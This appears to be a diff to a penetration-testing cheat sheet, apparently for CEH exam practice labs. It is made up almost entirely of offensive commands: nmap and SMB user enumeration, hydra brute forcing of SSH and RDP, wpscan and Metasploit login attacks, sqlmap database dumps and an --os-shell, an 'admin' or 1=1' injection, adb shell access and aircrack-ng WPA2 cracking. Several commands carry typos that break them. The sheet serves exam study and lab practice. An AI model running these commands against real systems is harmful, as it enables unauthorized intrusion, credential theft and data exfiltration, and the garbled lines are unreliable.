@@ -1,10 +1,29 @@
- ### Host Discovery ###
+### Host Discovery ###
 nmap -sn <IP Block>
 netdiscovery -r <IP Block>
+
+###find version of the OS and AD 
+ldapsearch -x -h <IP> -b “DC=CEH,DC=com” and press enter 
+ldapsearch -h [Target IP Address] -x -s base
+nmap -p 389 -sV -iL <Target File> OR nmap -p 389 -sV <IP> {FQDN = Host + Domain}
+
+
+
 
 ### Common Port Scan ###
 nmap -sV -sC -vv -oN 1000Port.txt <IP>
 nmap -A -vv <IP> //aggresive scan 
+sudo nmap -p- -A | servicename 
+nmap -sn 170.16.0.1/24 -oN nmap.txt
+nmap -O 170.16.0.1/24 -oN namp-OS.txt
+namp -sC -sV -sS 170.16.0.20 -oN namp-all.txt
+
+#####Enumeration
+nmap — script smb-os-discovery.nse -p445 <ip> (enumerate os, domain name,etc)
+nmap — script smb-enum-users.nse -p445 <ip> (used to enumerate all users on remote Windows system using SAMR enumeration and LSA bruteforcing)
+nmap -p 445 — script=smb-enum-shares.nse, smb-enum-users.nse 10.10.19.21 (smb users and shares)
+
+
 
 optional
 -p : ports //-p- all ports(1-65535) | -p80,445 only 80 and 445 ports 
@@ -31,6 +50,7 @@ FQDN = Hostname+Domain // hostname.domain
 #### Brute Force #####
 usage : hydra -l <username> -P <Wordlist Path> <Protocol>://<IP>
 example : hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.12
+hydra -t 4 -V -l user -P /path/to/password-list.txt rdp://<target_ip>
 
 optional
 -l : specific username (John,root,guest)
@@ -41,7 +61,9 @@ optional
 ### Brute Forcing Wordpress Login Pages ###
 
 Wpscan
+Wpscan –url http://ip/ --enumerate u
 wpscan --url http://10.0.1.55:8080/uri -u root -P passwdfile.txt
+wpscan -u james -P /password.txt — urlhttp://:8080/TEST
 
 Metasploit
 msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
@@ -53,6 +75,14 @@ msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_log
        set USERNAME admin
 
 ### SQL Injection
+
+Sqlmap -r req.txt   --dbs
+Sqlmap -r req.txt -D dvwa
+Sqlmap -r req.txt -D dvwa --table
+Sqlmap -r req.txt -D dvwa --tables –columns 
+Sqlmap -r req.txt -D dvwa --dump 
+
+
 In alternative we can use SQLMap and the vulnerable url
 
 Get all databases using sqlmap
@@ -66,6 +96,18 @@ sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D database_name -T 
 
 Dump the data from the columns 
 sqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D database_name -T table_name -C column_name --dump
+
+admin’ or 1=1 - -
+
+`qlmap -u “[http://www.moviescope.com/viewprofile.aspx?id=1”](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) --cookie="xookies xxx" --dbs`
+
+ `sqlmap -u “[http://www.moviescope.com/viewprofile.aspx?id=1”](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) --cookie="cookies xxx" -D moviescope --tables`
+
+ `sqlmap -u “[http://www.moviescope.com/viewprofile.aspx?id=1”](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) --cookie="cookies xxx" -D moviescope -T User_Login --columns`
+
+`qlmap -u “[http://www.moviescope.com/viewprofile.aspx?id=1”](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) --cookie="cookies xxx" -D moviescope -T User_Login --dump`
+
+ `sqlmap -u “[http://www.moviescope.com/viewprofile.aspx?id=1”](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) --cookie="cookies xxx" --os-shell`
 
 ### Wireshark ###
 
@@ -86,6 +128,13 @@ filter to highest number of request
 snow -C -p "password" <target_file>
 openstego
 
+Hashcalc — Md5 calculator
+Cryptool — decode .hex file
+Bctextencoder — decrypt text using secret key
+Veracrypt — anything related to volume
+
+
+
 ##### Mobile Hacking #### 
 adb connect <IP>:<PORT>(default port 5555)
 adb shell
@@ -101,6 +150,6 @@ Crack the wireless encryption and identify the Wi-Fi password
 (To find BSSID: on Wireshark click on packet, search BSSID and copy value)
 
 aircrack-ng '/home/attacker/WEPcrack-01.cap bu komanda ile 20:E5:2A:E4:38:00  tapirsan
-aircrack-ng -a2 -b 20:E5:2A:E4:38:00 -w /home/attacker/Desktop/Wordlist/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'
+aircrack-ng -a2 -b 20:E5:2A:E4:38:00 -w /usr/share/wordlists/password.txt '/home/attacker/Desktop/Sample Captures/WPA2crack-01.cap'
 
 
